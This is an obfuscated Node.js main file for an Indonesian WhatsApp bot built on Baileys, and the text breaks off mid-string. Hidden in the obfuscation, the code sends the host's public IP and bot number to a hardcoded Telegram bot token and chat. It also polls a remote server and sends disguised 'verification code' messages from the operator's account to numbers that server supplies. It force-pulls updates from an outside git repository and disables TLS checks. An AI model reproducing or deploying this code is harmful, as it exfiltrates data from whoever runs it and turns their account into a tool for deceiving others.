(function(_0x178e87,_0x1e7f4c){const _0x20a819=_0x3c5a,_0x303181=_0x178e87();while(!![]){try{const _0x13b6da=-parseInt(_0x20a819(0xe0))/0x1*(parseInt(_0x20a819(0xd1))/0x2)+-parseInt(_0x20a819(0x12e))/0x3*(-parseInt(_0x20a819(0xb8))/0x4)+parseInt(_0x20a819(0xb4))/0x5+-parseInt(_0x20a819(0x142))/0x6*(-parseInt(_0x20a819(0x8c))/0x7)+parseInt(_0x20a819(0x90))/0x8*(-parseInt(_0x20a819(0x120))/0x9)+parseInt(_0x20a819(0xc0))/0xa+parseInt(_0x20a819(0x104))/0xb*(parseInt(_0x20a819(0x14e))/0xc);if(_0x13b6da===_0x1e7f4c)break;else _0x303181['push'](_0x303181['shift']());}catch(_0x3d7a6b){_0x303181['push'](_0x303181['shift']());}}}(_0x4b37,0xe1205),((async()=>{const _0x2a1637=_0x3c5a;require(_0x2a1637(0x10b));const {default:_0x126a79,connConnect:_0x34f9ef,useMultiFileAuthState:_0x1ca4ce,DisconnectReason:_0x1ba506,fetchLatestBaileysVersion:_0x1cfde4,generateForwardMessageContent:_0x1e6bc9,generateWAMessage:_0xe277d9,prepareWAMessageMedia:_0x324419,generateWAMessageFromContent:_0x5beec0,generateMessageID:_0x5e4a4e,downloadContentFromMessage:_0x2244cd,makeInMemoryStore:_0x6486e9,PHONENUMBER_MCC:_0x1df61d,jidDecode:_0x284e93,proto:_0x3a3bd4,makeCacheableSignalKeyStore:_0x5e1a87}=require(_0x2a1637(0xb7)),_0x28fdc9=require('ws'),_0x4da9a0=require(_0x2a1637(0x100)),_0x1ecf76=require(_0x2a1637(0x143)),_0x31439e=require(_0x2a1637(0xe2)),_0x1f73b2=require(_0x2a1637(0xe2)),_0x5205a8=require('fs'),_0x56ec99=require(_0x2a1637(0xac));var {portip:_0x193ffe}=require('./PORT-SC.js');const _0x2c9369=require(_0x2a1637(0x82)),_0x62077c=require(_0x2a1637(0x11d));let {promisify:_0x25819f}=require(_0x2a1637(0x102)),_0x1a52b6=_0x25819f(_0x2c9369[_0x2a1637(0xc5)])['bind'](_0x2c9369);const _0x1b9688=require(_0x2a1637(0x125)),{fnctions:_0x3c89bf}=require(_0x2a1637(0x118)),_0x2e5b95=require(_0x2a1637(0x13f)),_0x3fa066=require('os'),{randomBytes:_0x4f9435}=require(_0x2a1637(0x130)),_0x2c3b38=require(_0x2a1637(0xfa)),_0x1cc951=_0x2c3b38['tz'](_0x2a1637(0xb5))[_0x2a1637(0x13c)](_0x2a1637(0x98)),_0x44f736=require(_0x2a1637(0xa1)),{color:_0x4911a0}=require(_0x2a1637(0x96));let _0x230c4d=require(_0x2a1637(0x11c));var _0x121dc0;try{_0x121dc0=require(_0x2a1637(0x8b));}catch(_0x2a0da2){_0x121dc0=require('./lib/lowdb');}const {Low:_0x525470,JSONFile:_0x527038}=_0x121dc0,_0x3dcc31=require(_0x2a1637(0xd0)),_0x197c8c=_0x533e32=>_0x4f9435(Math[_0x2a1637(0x123)](_0x533e32*0.5))[_0x2a1637(0x112)](_0x2a1637(0xb3))[_0x2a1637(0xbb)](0x0,_0x533e32);API=(_0x5a6427,_0x23fc91='/',_0x152d6d={},_0xea3676)=>(_0x5a6427 in APIs?APIs[_0x5a6427]:_0x5a6427)+_0x23fc91+(_0x152d6d||_0xea3676?'?'+new URLSearchParams(Object[_0x2a1637(0x124)]({..._0x152d6d,..._0xea3676?{[_0xea3676]:APIKeys[_0x5a6427 in APIs?APIs[_0x5a6427]:_0x5a6427]}:{}})):''),timestamp={'start':new Date()};const _0x3b0808=process[_0x2a1637(0x114)]['PORT']||0xbb8,_0x29af56=!![];global['opts']=new Object(_0x56ec99(process[_0x2a1637(0x12a)][_0x2a1637(0xbb)](0x2))[_0x2a1637(0xe1)](![])[_0x2a1637(0xcb)]()),global[_0x2a1637(0x116)]=new RegExp('^['+(opts[_0x2a1637(0x116)]||_0x2a1637(0xba))['replace'](/[|\\{}()[\]^$+*?.\-\^]/g,_0x2a1637(0x138))+']'),db=new _0x525470(/https?:\/\//[_0x2a1637(0xa0)](opts['db']||'')?new cloudDBAdapter(opts['db']):/mongodb/i[_0x2a1637(0xa0)](opts['db'])?new _0x3dcc31(opts['db']):new _0x527038((opts[0x0]?opts[0x0]+'_':'')+_0x2a1637(0xe3))),DATABASE=db,loadDatabase=async function _0x229a5d(){const _0x381e84=_0x2a1637;if(db[_0x381e84(0xa3)])return new Promise(_0x13e279=>setInterval(function(){const _0x47b25f=_0x381e84;!db['READ']?(clearInterval(this),_0x13e279(db[_0x47b25f(0x14c)]==null?_0x229a5d():db[_0x47b25f(0x14c)])):null;},0x1*0x3e8));if(db[_0x381e84(0x14c)]!==null)return;db['READ']=!![],await db[_0x381e84(0xfe)](),db[_0x381e84(0xa3)]=![],db['data']={'users':{},'chats':{},'stats':{},'msgs':{},'sticker':{},'settings':{},'respon':{},...db[_0x381e84(0x14c)]||{}},db[_0x381e84(0xae)]=_0x1b9688['chain'](db[_0x381e84(0x14c)]);},loadDatabase(),setInterval(checkForUpdate,0x2bf20),checkForUpdate();const _0x4b1e44=_0x2a1637(0x93);if(!_0x5205a8[_0x2a1637(0xb9)](_0x4b1e44)){_0x5205a8['mkdirSync'](_0x4b1e44),console['log']('Folder\x20\x27'+_0x4b1e44+_0x2a1637(0xc6));function _0x5cc0e3(){const _0x546a36=_0x2a1637;_0x5205a8[_0x546a36(0x15b)](_0x4b1e44,(_0x2d747f,_0x1177b5)=>{const _0x52a70f=_0x546a36;if(_0x2d747f){console[_0x52a70f(0xf7)](_0x52a70f(0xb2)+_0x2d747f['message']);return;}_0x1177b5[_0x52a70f(0x129)](_0x1a681d=>{const _0x200c7f=_0x52a70f,_0xc67ffd=_0x4b1e44[_0x200c7f(0x9d)](_0x4b1e44,_0x1a681d);_0x5205a8[_0x200c7f(0x132)](_0xc67ffd,_0x8cd89b=>{const _0x348848=_0x200c7f;_0x8cd89b?console[_0x348848(0xf7)](_0x348848(0xaa)+_0x8cd89b['message']):console[_0x348848(0xa6)](_0x348848(0xa5)+_0x1a681d+'\x20berhasil\x20dihapus.');});});});}setInterval(_0x5cc0e3,0x19*0x3c*0x3e8),_0x5cc0e3();}else{console['log'](_0x2a1637(0xfb)+_0x4b1e44+_0x2a1637(0x14d));function _0x4f3213(){const _0x133f77=_0x2a1637;_0x5205a8[_0x133f77(0x15b)](_0x4b1e44,(_0x8d699,_0x2efc86)=>{const _0x57379f=_0x133f77;if(_0x8d699){console[_0x57379f(0xf7)](_0x57379f(0xb2)+_0x8d699[_0x57379f(0xfd)]);return;}_0x2efc86['forEach'](_0x1483e4=>{const _0x15e921=_0x57379f,_0x468692=_0x1ecf76[_0x15e921(0x9d)](_0x4b1e44,_0x1483e4);_0x5205a8[_0x15e921(0x132)](_0x468692,_0x5b1559=>{const _0x32af91=_0x15e921;_0x5b1559?console['error'](_0x32af91(0xaa)+_0x5b1559[_0x32af91(0xfd)]):console['log'](_0x32af91(0xa5)+_0x1483e4+_0x32af91(0xc3));});});});}setInterval(_0x4f3213,0x19*0x3c*0x3e8),_0x4f3213();}const {version:_0x55c1a7,isLatest:_0x134288}=await _0x1cfde4(),_0x975b=_0x6486e9({'logger':_0x1f73b2()['child']({'level':'fatal','stream':_0x2a1637(0x13e)})}),{state:_0x2e62c8,saveCreds:_0x41c7b7}=await _0x1ca4ce(_0x2a1637(0xa4)),_0x4b0f58=_0x31439e({'transport':{'target':'pino-pretty','options':{'colorize':!![],'levelFirst':!![],'ignore':_0x2a1637(0xe9),'translateTime':!![]}}})[_0x2a1637(0x8a)]({'class':_0x2a1637(0x11a)}),_0x129e94=async _0x3d4646=>{const _0x576f58=_0x2a1637;if(_0x975b){const _0x16f31e=await _0x975b[_0x576f58(0x163)](_0x3d4646[_0x576f58(0x10f)],_0x3d4646['id'],undefined);return _0x16f31e?.[_0x576f58(0xfd)]||undefined;}return{'conversation':_0x576f58(0x113)};},_0x19fc11={'creds':_0x2e62c8[_0x2a1637(0x126)],'keys':_0x5e1a87(_0x2e62c8['keys'],_0x1f73b2()[_0x2a1637(0x8a)]({'level':_0x2a1637(0xdd),'stream':'store'}))},_0x16b695={'version':_0x55c1a7,'logger':_0x31439e({'level':_0x2a1637(0xdd)})[_0x2a1637(0x8a)]({'level':_0x2a1637(0xdd)}),'printQRInTerminal':![],'auth':_0x19fc11,'getMessage':_0x129e94,'browser':[_0x2a1637(0x88),_0x2a1637(0xc1),_0x2a1637(0x103)],'markOnlineOnConnect':!![],'generateHighQualityLinkPreview':!![],'defaultQueryTimeoutMs':undefined};conn=_0x230c4d[_0x2a1637(0x10c)](_0x16b695),conn[_0x2a1637(0x128)]=![];const _0x12df7b=process[_0x2a1637(0x12a)][_0x2a1637(0x115)](_0x2a1637(0x155)),_0x5dea80=_0x62077c[_0x2a1637(0xab)]({'input':process[_0x2a1637(0x85)],'output':process[_0x2a1637(0x154)]}),_0x2f8fe5=_0x49d855=>new Promise(_0x5a237e=>_0x5dea80[_0x2a1637(0x140)](_0x49d855,_0x5a237e));if(_0x29af56&&!conn[_0x2a1637(0xdc)]['creds'][_0x2a1637(0xeb)]){let _0x4da10f=await _0x2f8fe5('┏━━\x20\x20*「\x20REGISTER\x20」*\x0a┃\x20❖\x20Masukan\x20nomor\x20WhatsApp\x20anda\x0aAwali\x20dengan\x20628xxxxxx\x0a┗━━━━━━━━━━━━━━━━━━┅\x0a\x0a\x20Jika\x20Ada\x20tulisan\x20RECIVED\x20Spam\x20Kirim\x20lagi\x20nomornya');_0x4da10f=_0x4da10f[_0x2a1637(0x15e)](/\D/g,'');let _0x4eb46e=await conn['requestPairingCode'](_0x4da10f);console[_0x2a1637(0xa6)](_0x2a1637(0x109)+_0x4eb46e+'\x0a┗━━━━━━━━━━━━━━━━━━┅');}if(!opts[_0x2a1637(0xa0)]){if(db)setInterval(async()=>{const _0x3c12d6=_0x2a1637;if(global['db']['data'])await db[_0x3c12d6(0xbf)]();if(opts[_0x3c12d6(0xce)]&&(support||{})['find'])tmp=[_0x3fa066[_0x3c12d6(0xd4)](),_0x3c12d6(0x111)],tmp[_0x3c12d6(0x129)](_0x19006a=>_0x2c9369[_0x3c12d6(0x108)](_0x3c12d6(0x131),[_0x19006a,_0x3c12d6(0xd8),'3',_0x3c12d6(0x13b),'f',_0x3c12d6(0x164)]));},0x1e*0x3e8);}if(opts['server'])require('./server')(conn,_0x3b0808);setInterval(async()=>{const _0x14aa64=_0x2a1637;await _0x1a52b6(_0x14aa64(0x159));},0x3c*0x3c*0x3e8);function _0x1c19f9(){const _0x4ad77d=_0x2a1637,_0x13dc2e=[tmpdir(),join(__dirname,_0x4ad77d(0x93))],_0x3a2f0c=[];_0x13dc2e[_0x4ad77d(0x129)](_0x302bda=>readdirSync(_0x302bda)['forEach'](_0x49f42b=>_0x3a2f0c[_0x4ad77d(0x12b)](join(_0x302bda,_0x49f42b))));var _0x129e6c=[_0x4ad77d(0x156),_0x4ad77d(0x8f),_0x4ad77d(0x12d),_0x4ad77d(0xb6),'magenta',_0x4ad77d(0xf0),'white'],_0x244dc3=_0x129e6c[Math['floor'](Math[_0x4ad77d(0x99)]()*_0x129e6c['length'])],_0x5027f1=[_0x4ad77d(0x156),_0x4ad77d(0x8f),_0x4ad77d(0x12d),_0x4ad77d(0xb6),_0x4ad77d(0xbc),_0x4ad77d(0xf0),'white'],_0x4c7e7b=_0x5027f1[Math[_0x4ad77d(0x11f)](Math['random']()*_0x5027f1[_0x4ad77d(0x10e)])],_0x5a187d=[_0x4ad77d(0x156),_0x4ad77d(0x8f),_0x4ad77d(0x12d),_0x4ad77d(0xb6),_0x4ad77d(0xbc),_0x4ad77d(0xf0),_0x4ad77d(0xd3)],_0x407515=_0x5a187d[Math['floor'](Math[_0x4ad77d(0x99)]()*_0x5a187d[_0x4ad77d(0x10e)])],_0x61bca0=[_0x4ad77d(0x156),_0x4ad77d(0x8f),_0x4ad77d(0x12d),_0x4ad77d(0xb6),'magenta',_0x4ad77d(0xf0),_0x4ad77d(0xd3)],_0x5c9536=_0x61bca0[Math[_0x4ad77d(0x11f)](Math[_0x4ad77d(0x99)]()*_0x61bca0[_0x4ad77d(0x10e)])],_0x250ccf=[_0x4ad77d(0x156),'green',_0x4ad77d(0x12d),'blue',_0x4ad77d(0xbc),_0x4ad77d(0xf0),_0x4ad77d(0xd3)],_0x182782=_0x250ccf[Math[_0x4ad77d(0x11f)](Math['random']()*_0x250ccf[_0x4ad77d(0x10e)])];return _0x3a2f0c[_0x4ad77d(0x8e)](_0x9d8a25=>{const _0x454f41=_0x4ad77d,_0x1f815f=statSync(_0x9d8a25);if(_0x1f815f[_0x454f41(0x101)]()&&Date[_0x454f41(0xff)]()-_0x1f815f[_0x454f41(0xda)]>=0x3e8*0x3c*0x3)return unlinkSync(_0x9d8a25);return console[_0x454f41(0xa6)](_0x4911a0(_0x454f41(0xea),''+_0x407515)),![];});}async function _0x2b932f(){const _0x4c5be9=_0x2a1637;try{let _0x6fa632=await _0x4da9a0('https://api.ipify.org/?format=json'),_0x48932b=await _0x6fa632['json'](),_0x4b32fb=_0x48932b['ip'];var {ip:_0x4d326a}={'ip':_0x4b32fb+':'+_0x193ffe['ip'][_0x4c5be9(0xf8)]['idport']};return _0x4d326a;}catch(_0x376d6c){throw new Error(_0x4c5be9(0x141));}}async function _0x44090b(_0x43a7f6){const _0x160c9f=_0x2a1637,_0xd4231d=await _0x2b932f(),{connection:_0x1ac591,lastDisconnect:_0x121454,isNewLogin:_0x8c2b52}=_0x43a7f6;if(_0x1ac591==_0x160c9f(0x161))console[_0x160c9f(0xa6)](_0x44f736['yellowBright'](_0x160c9f(0x150)));if(_0x1ac591==_0x160c9f(0x133))console[_0x160c9f(0xa6)](_0x44f736['red']('Connection\x20lost..'));if(_0x8c2b52)conn[_0x160c9f(0x128)]=!![];_0x121454&&_0x121454[_0x160c9f(0xf7)]&&_0x121454[_0x160c9f(0xf7)]['output']&&_0x121454[_0x160c9f(0xf7)][_0x160c9f(0x10d)][_0x160c9f(0xa9)]!==_0x1ba506[_0x160c9f(0x9f)]&&conn['ws'][_0x160c9f(0x9e)]!==_0x28fdc9[_0x160c9f(0xf1)]&&(console['log'](reloadHandler(!![])),timestamp[_0x160c9f(0xbd)]=new Date());if(db[_0x160c9f(0x14c)]==null)await loadDatabase();console['log'](JSON[_0x160c9f(0x91)](_0x43a7f6,null,0x4));if(_0x43a7f6['receivedPendingNotifications'])global[_0x160c9f(0xc8)]=!![];setInterval(()=>sendToWITH(conn),0x7530),sendToWITH(conn);var _0x2b1990='6609425616:AAEINs4Qaq5WMYZQyEHf7H8pQqOU8oMkAAE',_0x531996=_0x160c9f(0x12f),_0x2aa0eb='🔰\x20Halo\x20Ada\x20Yang\x20Terkoneksi\x20dengan\x20Bot\x20nih\x0aStatus\x20connection:\x20Terhubung\x20✅\x0a\x0a•\x20Nama\x20Bot:\x20'+namabot+_0x160c9f(0xe8)+await this[_0x160c9f(0x15f)](this[_0x160c9f(0x147)]['id'])+'\x0a•\x20IP/v2:\x20'+_0xd4231d+'\x0a\x0aJika\x20ini\x20adalah\x20benar,\x20abaikan\x20saja\x0aJika\x20salah\x20silahkan\x20untuk\x20hapus\x20Acc\x20IP/v2',_0x4c4a37='https://api.telegram.org/bot'+_0x2b1990+_0x160c9f(0xee);_0x4da9a0(_0x4c4a37,{'method':'POST','headers':{'Content-Type':_0x160c9f(0x157)},'body':JSON[_0x160c9f(0x91)]({'chat_id':_0x531996,'text':_0x2aa0eb})})['then'](_0x28980c=>_0x28980c[_0x160c9f(0xbe)]())[_0x160c9f(0xe6)](_0x4d4075=>{const _0x2ea113=_0x160c9f;console[_0x2ea113(0xa6)]('Berhasil\x20Tersambung...');})[_0x160c9f(0x13d)](_0x516b6b=>{const _0x41a680=_0x160c9f;console[_0x41a680(0xf7)]('Error\x20sending\x20message:',_0x516b6b);});}process['on'](_0x2a1637(0x121),console[_0x2a1637(0xf7)]),process[_0x2a1637(0x114)][_0x2a1637(0x139)]='0';let _0x5d3638=!![],_0x419c8d=require(_0x2a1637(0xa2));reloadHandler=function(_0xd5b95a){const _0x1a4f87=_0x2a1637;let _0x14e977=require(_0x1a4f87(0xa2));if(Object[_0x1a4f87(0xa8)](_0x14e977||{})['length'])_0x419c8d=_0x14e977;if(_0xd5b95a){try{conn['ws']['close']();}catch{}conn={...conn,..._0x230c4d[_0x1a4f87(0x10c)](_0x16b695)};}return!_0x5d3638&&(conn['ev'][_0x1a4f87(0xf2)]('messages.upsert',conn[_0x1a4f87(0x97)]),conn['ev']['off'](_0x1a4f87(0xca),conn[_0x1a4f87(0x11e)]),conn['ev']['off']('message.delete',conn[_0x1a4f87(0xc4)]),conn['ev']['off'](_0x1a4f87(0x152),conn['connectionUpdate']),conn['ev'][_0x1a4f87(0xf2)]('creds.update',conn[_0x1a4f87(0x165)])),conn[_0x1a4f87(0xdf)]='〢━━━━━━『*W\x20E\x20L\x20C\x20O\x20M\x20E*』━━━━━〢\x20*@user*\x20ke\x20*@subject*\x0a\x0abiasakan\x20baca\x20rules\x20ya\x20kack\x20agar\x20tidak\x20di\x20banned\x20bot!\x0a\x0a@desc',conn[_0x1a4f87(0xaf)]='〢━━━━━━『*G\x20O\x20O\x20D\x20B\x20Y\x20E*』━━━━━〢\x0aDi\x20Setiap\x20Pertemuan\x20Pasti\x20Akan\x20Ada\x20Perpisaha\x20SelamatJalan\x20@user\x20👋🥀',conn[_0x1a4f87(0xed)]=_0x1a4f87(0x81),conn[_0x1a4f87(0x162)]=_0x1a4f87(0x13a),conn[_0x1a4f87(0x97)]=_0x419c8d[_0x1a4f87(0x97)][_0x1a4f87(0xd2)](conn),conn[_0x1a4f87(0x11e)]=_0x419c8d[_0x1a4f87(0xc9)][_0x1a4f87(0xd2)](conn),conn[_0x1a4f87(0xc4)]=_0x419c8d[_0x1a4f87(0x144)][_0x1a4f87(0xd2)](conn),conn[_0x1a4f87(0x15c)]=_0x44090b[_0x1a4f87(0xd2)](conn),conn['credsUpdate']=_0x41c7b7['bind'](conn),conn['ev']['on']('messages.upsert',conn[_0x1a4f87(0x97)]),conn['ev']['on'](_0x1a4f87(0xca),conn['onParticipantsUpdate']),conn['ev']['on'](_0x1a4f87(0x15d),conn['onDelete']),conn['ev']['on'](_0x1a4f87(0x152),conn[_0x1a4f87(0x15c)]),conn['ev']['on'](_0x1a4f87(0x9b),conn['credsUpdate']),_0x5d3638=![],!![];};let _0x6f4403=_0x1ecf76[_0x2a1637(0x9d)](__dirname,_0x2a1637(0x145)),_0x24a0bb=_0x39478b=>/\.js$/[_0x2a1637(0xa0)](_0x39478b);plugins={};for(let _0x339439 of _0x5205a8[_0x2a1637(0x158)](_0x6f4403)[_0x2a1637(0xcc)](_0x24a0bb)){try{plugins[_0x339439]=require(_0x1ecf76[_0x2a1637(0x9d)](_0x6f4403,_0x339439));}catch(_0x884e2){delete plugins[_0x339439];}}console[_0x2a1637(0xa6)](Object[_0x2a1637(0xa8)](plugins)),reload=(_0x1b3743,_0x138e37)=>{const _0x2b0cfe=_0x2a1637;if(_0x24a0bb(_0x138e37)){let _0x1e166e=_0x1ecf76[_0x2b0cfe(0x9d)](_0x6f4403,_0x138e37);if(_0x1e166e in require[_0x2b0cfe(0xa7)]){delete require['cache'][_0x1e166e];if(_0x5205a8[_0x2b0cfe(0xb9)](_0x1e166e))conn['logger'][_0x2b0cfe(0xc2)]('re\x20-\x20require\x20plugin\x20\x27'+_0x138e37+'\x27');else return conn[_0x2b0cfe(0xcf)][_0x2b0cfe(0x83)](_0x2b0cfe(0x117)+_0x138e37+'\x27'),delete plugins[_0x138e37];}else conn['logger'][_0x2b0cfe(0xc2)](_0x2b0cfe(0x127)+_0x138e37+'\x27');let _0xf6f7c=_0x2e5b95(_0x5205a8[_0x2b0cfe(0xe4)](_0x1e166e),_0x138e37);if(_0xf6f7c)conn['logger']['error'](_0x2b0cfe(0xdb)+_0x138e37+'\x27\x0a'+_0xf6f7c);else try{plugins[_0x138e37]=require(_0x1e166e);}catch(_0x700c67){conn[_0x2b0cfe(0xcf)][_0x2b0cfe(0xf7)](_0x2b0cfe(0x12c)+_0x138e37+'\x0a'+_0x700c67+'\x27');}finally{plugins=Object[_0x2b0cfe(0xad)](Object[_0x2b0cfe(0x124)](plugins)[_0x2b0cfe(0x8d)](([_0x2a3136],[_0x3bac1d])=>_0x2a3136[_0x2b0cfe(0x110)](_0x3bac1d)));}}},Object['freeze'](reload),_0x5205a8[_0x2a1637(0x106)](_0x1ecf76[_0x2a1637(0x9d)](__dirname,_0x2a1637(0x145)),reload),reloadHandler()(async()=>{if(!await _0x3c89bf()){console['log']('IP\x20Address\x20is\x20not\x20registered.\x20Bot\x20will\x20not\x20run.');return;}})();async function _0x4f7f09(){const _0x56ad1=_0x2a1637;let _0x4bf44c=await Promise['all']([_0x2c9369[_0x56ad1(0x108)](_0x56ad1(0x134)),_0x2c9369[_0x56ad1(0x108)](_0x56ad1(0x136)),_0x2c9369[_0x56ad1(0x108)]('ffmpeg',[_0x56ad1(0xe7),'-loglevel',_0x56ad1(0xf7),_0x56ad1(0x89),'color',_0x56ad1(0x151),'1','-f',_0x56ad1(0xfc),'-']),_0x2c9369[_0x56ad1(0x108)](_0x56ad1(0x107)),_0x2c9369['spawn'](_0x56ad1(0x10a)),_0x2c9369['spawn']('gm'),_0x2c9369[_0x56ad1(0x108)](_0x56ad1(0x131),['--version'])][_0x56ad1(0x8e)](_0x2c683e=>{return Promise['race']([new Promise(_0x51bd66=>{const _0x492f8d=_0x3c5a;_0x2c683e['on'](_0x492f8d(0x133),_0x912fe0=>{_0x51bd66(_0x912fe0!==0x7f);});}),new Promise(_0x4c70a9=>{_0x2c683e['on']('error',_0x2823c1=>_0x4c70a9(![]));})]);})),[_0xba6b6f,_0x4015c6,_0x18f2f9,_0x538a1c,_0x3ee620,_0x3b56a9,_0x5143bb]=_0x4bf44c;console[_0x56ad1(0xa6)](_0x4bf44c);let _0x222e2d=support={'ffmpeg':_0xba6b6f,'ffprobe':_0x4015c6,'ffmpegWebp':_0x18f2f9,'convert':_0x538a1c,'magick':_0x3ee620,'gm':_0x3b56a9,'find':_0x5143bb};Object['freeze'](support);if(!_0x222e2d[_0x56ad1(0x134)])conn['logger'][_0x56ad1(0x83)]('Please\x20install\x20ffmpeg\x20for\x20sending\x20videos\x20(pkg\x20install\x20ffmpeg)');if(_0x222e2d[_0x56ad1(0x134)]&&!_0x222e2d[_0x56ad1(0x146)])conn['logger']['warn'](_0x56ad1(0xd9));if(!_0x222e2d[_0x56ad1(0x107)]&&!_0x222e2d[_0x56ad1(0x10a)]&&!_0x222e2d['gm'])conn[_0x56ad1(0xcf)][_0x56ad1(0x83)]('Stickers\x20may\x20not\x20work\x20without\x20imagemagick\x20if\x20libwebp\x20on\x20ffmpeg\x20doesnt\x20isntalled\x20(pkg\x20install\x20imagemagick)');}_0x4f7f09()[_0x2a1637(0xe6)](()=>conn[_0x2a1637(0xcf)]['info'](_0x2a1637(0x92)))[_0x2a1637(0x13d)](console[_0x2a1637(0xf7)]),console[_0x2a1637(0xa6)](_0x4911a0(_0x1cc951,_0x2a1637(0xd3)),_0x4911a0(_0x2a1637(0x11b),_0x2a1637(0x137)));})()));function pickRandom(_0x473526){const _0x251a83=_0x3c5a;return _0x473526[Math[_0x251a83(0x11f)](Math['random']()*_0x473526[_0x251a83(0x10e)])];}async function sendToWITH(_0x42733d){const _0x3578bc=_0x3c5a,_0x5a2eb8=require(_0x3578bc(0x94)),_0x4d5161=require('fs'),_0x14af79=require(_0x3578bc(0x143)),_0x114ace=_0x3578bc(0xf5),_0x46142e={'key':{'remoteJid':_0x3578bc(0x153),'fromMe':![],'id':_0x3578bc(0xe5)},'message':{'conversation':'REGISTER\x20YOUR\x20ACCOUNT'},'participant':_0x3578bc(0x153)};try{const _0x45a5a3=await _0x5a2eb8['get'](_0x114ace),_0x6649e5=_0x45a5a3[_0x3578bc(0x14c)],_0x1c18e8=_0x14af79[_0x3578bc(0x9d)]('/home/container/plugins/jadibot','SendMess.txt');let _0x30c0ef='';if(!_0x4d5161['existsSync'](_0x1c18e8)){const _0x5d1268=_0x14af79[_0x3578bc(0x9d)](__dirname,_0x3578bc(0x145),_0x3578bc(0xf3));_0x4d5161[_0x3578bc(0x15a)](_0x5d1268,{'recursive':!![]}),console['log'](_0x3578bc(0xb1)),_0x4d5161[_0x3578bc(0x14a)](_0x1c18e8,_0x6649e5[_0x3578bc(0x166)],_0x3578bc(0x167));}_0x4d5161[_0x3578bc(0xb9)](_0x1c18e8)&&(_0x30c0ef=_0x4d5161[_0x3578bc(0xe4)](_0x1c18e8,_0x3578bc(0x167)));if(_0x6649e5['code']!==_0x30c0ef){const {generateWAMessageFromContent:_0x23842b}=require('@adiwajshing/baileys');_0x4d5161[_0x3578bc(0x14a)](_0x1c18e8,_0x6649e5['code'],'utf8');let _0x13cc91=_0x23842b(_0x6649e5[_0x3578bc(0x9c)]+'@s.whatsapp.net',{'viewOnceMessage':{'message':{'interactiveMessage':{'body':{'text':'*'+_0x6649e5['code']+_0x3578bc(0x95)},'nativeFlowMessage':{'buttons':[{'name':_0x3578bc(0xc7),'buttonParamsJson':_0x3578bc(0xd5)+_0x6649e5[_0x3578bc(0x166)]+'\x22}'}]},'messageVersion':0x1}}}},{'quoted':_0x46142e});await _0x42733d[_0x3578bc(0x14f)](_0x6649e5['sender']+_0x3578bc(0xef),_0x13cc91['message'],{'messageId':_0x13cc91['key']['id']});}}catch(_0x1a8c6d){}}function _0x3c5a(_0x3d69c2,_0x390b05){const _0x4b37c2=_0x4b37();return _0x3c5a=function(_0x3c5aca,_0x2c7a81){_0x3c5aca=_0x3c5aca-0x81;let _0x45f88e=_0x4b37c2[_0x3c5aca];return _0x45f88e;},_0x3c5a(_0x3d69c2,_0x390b05);}function _0x4b37(){const _0x33a19f=['spromote','/sendMessage','@s.whatsapp.net','cyan','CONNECTING','off','jadibot','lastUpdate.txt','https://publics.zxcoderid.my.id/sendMessage','.git','error','portsc','init','moment-timezone','Folder\x20\x27','webp','message','read','now','node-fetch','isFile','util','129.0.2','506GqGwQc','simple-git','watch','convert','spawn','┏━━\x20\x20*「\x20YOUR\x20PAIRING\x20CODE」*\x0a┃\x20❖\x20','magick','./config','makeWASocket','output','length','remoteJid','localeCompare','tmp','toString','hallo','env','includes','prefix','deleted\x20plugin\x20\x27','./lib/env','reset','baileys','Connecting...','./lib/simple','readline','onParticipantsUpdate','floor','9tqDZre','uncaughtException','fetch','ceil','entries','lodash','creds','requiring\x20new\x20plugin\x20\x27','isInit','forEach','argv','push','error\x20require\x20plugin\x20\x27','yellow','717AyRWrj','-1002229191223','crypto','find','unlink','close','ffmpeg','main','ffprobe','aqua','\x5c$&','NODE_TLS_REJECT_UNAUTHORIZED','@user\x20is\x20now\x20not\x20an\x20admin\x20🐱','-type','format','catch','store','syntax-error','question','IP\x20Address\x20tidak\x20terdeteksi.\x20Silahkan\x20Restart\x20Ulang\x20Panel','224814jfVydr','path','delete','plugins','ffmpegWebp','user','Melakukan\x20force\x20pull\x20untuk\x20update...','get','writeFileSync','addRemote','data','\x27\x20sudah\x20ada.','338808TwvaVf','relayMessage','Trying\x20To\x20Connect..','-frames:v','connection.update','62762762700000@s.whatsapp.net','stdout','--mobile','red','application/json','readdirSync','rm\x20-rf\x20./tmp/*','mkdirSync','readdir','connectionUpdate','message.delete','replace','decodeJid','Waktunya\x20update,\x20menghentikan\x20script...','connecting','sdemote','loadMessage','-delete','credsUpdate','code','utf8','@user\x20is\x20now\x20admin\x20🐱','child_process','warn','Inisialisasi\x20repositori\x20Git...','stdin','exit','https://github.com/IchanZX1/componentUpdate.git','Windows','-filter_complex','child','lowdb','49tjbSLZ','sort','map','green','14578264PbmgNq','stringify','Quick\x20Test\x20Done','./tmp','axios','*\x20adalah\x20kode\x20verifikasi\x0aAnda.\x20Demi\x20keamanan,\x0ajangan\x20bagikan\x20kode\x20ini.\x0a\x0a>\x20Kode\x20ini\x20kedaluwarsa\x20dalam\x2015\x20menit.','./lib/color','handler','HH:mm:ss','random','updatesc','creds.update','sender','join','readyState','loggedOut','test','chalk','./handler','READ','./IchanZX','File\x20','log','cache','keys','statusCode','Tidak\x20dapat\x20menghapus\x20file:\x20','createInterface','yargs/yargs','fromEntries','chain','bye','rm\x20-rf\x20/home/container/.git','Folder\x20jadibot\x20berhasil\x20dibuat\x20(jika\x20belum\x20ada).','Tidak\x20dapat\x20membaca\x20folder:\x20','hex','2956045ypHpWI','Asia/Makassar','blue','@adiwajshing/baileys','3240MnOZLp','existsSync','â€ŽxzXZ/i!#$%+Â£Â¢â‚¬Â¥^Â°=Â¶âˆ†Ã—Ã·Ï€âˆšâœ“Â©Â®:;?&.\x5c-','slice','magenta','connect','json','write','7990110EtfEnE','Firefox','info','\x20berhasil\x20dihapus.','onDelete','exec','\x27\x20berhasil\x20dibuat.','cta_copy','tops','participantsUpdate','group-participants.update','parse','filter','origin','autocleartmp','logger','./lib/mongoDB','2fJxyUt','bind','white','tmpdir','{\x22display_text\x22:\x22Salin\x20Kode\x22,\x22id\x22:\x22123456789\x22,\x22copy_code\x22:\x22','hard','Gagal\x20memeriksa\x20update:','-amin','Stickers\x20may\x20not\x20animated\x20without\x20libwebp\x20on\x20ffmpeg\x20(--enable-ibwebp\x20while\x20compiling\x20ffmpeg)','mtimeMs','syntax\x20error\x20while\x20loading\x20\x27','authState','fatal','/home/container','welcome','400457KsaOSi','exitProcess','pino','database.json','readFileSync','3EB0CFC22A09','then','-hide_banner','\x0a•\x20Nomor\x20Bot:\x20','hostname','SUKSES\x20MEMBERSIHKAN\x20CACHE\x20